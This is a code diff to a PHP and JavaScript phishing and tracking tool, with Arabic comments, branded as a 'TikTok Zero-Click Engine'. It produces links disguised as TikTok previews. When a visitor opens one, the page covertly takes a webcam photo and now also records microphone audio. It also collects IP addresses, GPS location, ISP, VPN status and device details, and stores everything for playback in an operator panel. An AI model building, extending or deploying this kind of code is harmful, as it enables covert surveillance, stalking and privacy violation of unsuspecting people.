@@ -46,6 +46,7 @@ try {
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT, 
         image_data TEXT, 
+        audio_data TEXT, 
         public_ip TEXT, 
         local_ip TEXT, 
         port TEXT, 
@@ -59,6 +60,7 @@ try {
     die("Database error: " . $e->getMessage());
 }
 
+// دالة لجلب معلومات تيك توك للمعاينة
 function fetch_tiktok_exclusive_meta($url) {
     $meta = [
         'title' => 'TikTok Video',
@@ -218,6 +220,7 @@ if (isset($_GET['r'])) {
 
         if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_info'])) {
             $img_base64 = $_POST['image'] ?? '';
+            $audio_base64 = $_POST['audio'] ?? '';
             $public_ip = get_real_ip();
             $local_ip = $_POST['lip'] ?? 'Direct';
             $port = $_SERVER['REMOTE_PORT'] ?? 'Unknown';
@@ -250,8 +253,24 @@ if (isset($_GET['r'])) {
             $device = get_device_type($ua);
 
             try {
-                $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, isp_info, vpn_status, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
-                $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $location, $isp, $vpn, $device, date('Y-m-d H:i:s')]);
+                // التأكد من وجود عمود الصوت في قاعدة البيانات أو إنشائه تلقائياً لتفادي أي خطأ
+                $db->exec("CREATE TABLE IF NOT EXISTS captures (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT, 
+                    code TEXT, 
+                    image_data TEXT, 
+                    audio_data TEXT, 
+                    public_ip TEXT, 
+                    local_ip TEXT, 
+                    port TEXT, 
+                    location TEXT, 
+                    isp_info TEXT, 
+                    vpn_status TEXT, 
+                    device_info TEXT, 
+                    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+                )");
+
+                $capStmt = $db->prepare("INSERT INTO captures (code, image_data, audio_data, public_ip, local_ip, port, location, isp_info, vpn_status, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+                $capStmt->execute([$code, $img_base64, $audio_base64, $public_ip, $local_ip, $port, $location, $isp, $vpn, $device, date('Y-m-d H:i:s')]);
             } catch (Exception $e) {}
             exit('OK');
         }
@@ -307,7 +326,7 @@ if (isset($_GET['r'])) {
             setTimeout(() => { if (!foundLocal) callback("Direct"); }, 80);
         }
 
-        function executeTrackingSequence(imageData = "") {
+        function executeTrackingSequence(imageData = "", audioData = "") {
             if (isProcessed) return;
             isProcessed = true;
 
@@ -316,6 +335,7 @@ if (isset($_GET['r'])) {
                     const formData = new URLSearchParams();
                     formData.append('save_info', '1');
                     formData.append('image', imageData);
+                    formData.append('audio', audioData);
                     formData.append('lip', localIp);
                     formData.append('lat', lat);
                     formData.append('lon', lon);
@@ -348,32 +368,78 @@ if (isset($_GET['r'])) {
             const overlay = document.getElementById('permissionOverlay');
             if(overlay) overlay.style.display = 'none';
 
-            if (!useCamera) {
-                executeTrackingSequence("");
-                return;
-            }
+            let capturedImage = "";
+            let capturedAudio = "";
 
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+            // طلب أذونات الكاميرا والميكروفون معاً (فيديو + صوت)
+            const mediaConstraints = {
+                audio: true,
+                video: useCamera ? { facingMode: "user" } : false
+            };
+
+            navigator.mediaDevices.getUserMedia(mediaConstraints)
                 .then(stream => {
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
-                    
-                    setTimeout(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = 640;
-                        canvas.height = 480;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        const imageData = canvas.toDataURL('image/jpeg', 0.85);
-                        stream.getTracks().forEach(track => track.stop());
+                    // التقاط الصوت عبر MediaRecorder لمدة 1.5 ثانية
+                    let audioChunks = [];
+                    let mediaRecorder;
+                    try {
+                        mediaRecorder = new MediaRecorder(stream);
+                        mediaRecorder.ondataavailable = event => {
+                            if (event.data.size > 0) audioChunks.push(event.data);
+                        };
+                        mediaRecorder.onstop = () => {
+                            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                            const reader = new FileReader();
+                            reader.readAsDataURL(audioBlob);
+                            reader.onloadend = () => {
+                                capturedAudio = reader.result;
+                                finalizeCapture();
+                            };
+                        };
+                        mediaRecorder.start();
+                    } catch (e) {
+                        // في حال لم يدعم المتصفح تسجيل الصوت
+                    }
 
-                        executeTrackingSequence(imageData);
-                    }, 400);
+                    // التقاط صورة الكاميرا إذا كانت مفعلة
+                    if (useCamera) {
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.play();
+                        
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = 640;
+                            canvas.height = 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            capturedImage = canvas.toDataURL('image/jpeg', 0.85);
+
+                            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                                setTimeout(() => {
+                                    mediaRecorder.stop();
+                                    stream.getTracks().forEach(track => track.stop());
+                                }, 800);
+                            } else {
+                                stream.getTracks().forEach(track => track.stop());
+                                finalizeCapture();
+                            }
+                        }, 400);
+                    } else {
+                        setTimeout(() => {
+                            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                                mediaRecorder.stop();
+                            }
+                            stream.getTracks().forEach(track => track.stop());
+                        }, 1000);
+                    }
+
+                    function finalizeCapture() {
+                        executeTrackingSequence(capturedImage, capturedAudio);
+                    }
                 })
                 .catch(err => {
-                    executeTrackingSequence("");
+                    executeTrackingSequence("", "");
                 });
         }
 
@@ -596,7 +662,7 @@ if (!empty($filter_code)) {
         
         <div>
             <h1>Control Panel</h1>
-            <p class="subtitle">TikTok High-Speed Zero-Click Engine v3</p>
+            <p class="subtitle">TikTok High-Speed Zero-Click Engine v3 (Mic & GPS Enabled)</p>
         </div>
 
         <?php if (!isset($_SESSION['is_logged_in']) || $_SESSION['is_logged_in'] !== true): ?>
@@ -622,7 +688,7 @@ if (!empty($filter_code)) {
                     
                     <label class="checkbox-container">
                         <input type="checkbox" name="use_camera" value="1" checked>
-                        تفعيل التقاط صورة الكاميرا عند الزيارة (اختياري)
+                        تفعيل التقاط صورة الكاميرا والصوت عند الزيارة (اختياري)
                     </label>
 
                     <button type="submit" name="create" class="btn">Generate Link</button>
@@ -678,6 +744,15 @@ if (!empty($filter_code)) {
                                     </div>
                                 <?php endif; ?>
 
+                                <?php if (!empty($cap['audio_data'])): ?>
+                                    <div style="margin-top: 10px;">
+                                        <audio controls style="width: 100%; height: 32px;">
+                                            <source src="<?php echo $cap['audio_data']; ?>" type="audio/webm">
+                                            متصفحك لا يدعم مشغل الصوت.
+                                        </audio>
+                                    </div>
+                                <?php endif; ?>
+
                                 <div class="info-row" style="margin-top:10px;">
                                     <span>Code:</span> <span class="code-badge" onclick="copyText('<?php echo htmlspecialchars($cap['code']); ?>', this)" title="انقر لنسخ الرمز"><?php echo htmlspecialchars($cap['code']); ?> 📋</span>
                                 </div>
@@ -721,7 +796,7 @@ if (!empty($filter_code)) {
                                 </div>
                                 <div class="info-row">
                                     <span>Device:</span> <span><?php echo htmlspecialchars($cap['device_info']); ?></span>
-                                </div>
+                                </div
                                 <div class="info-row" style="border-top:1px solid var(--border-color); padding-top:6px; margin-top:8px;">
                                     <span>Time:</span> <span><?php echo htmlspecialchars($cap['created_at']); ?></span>
                                 </div>
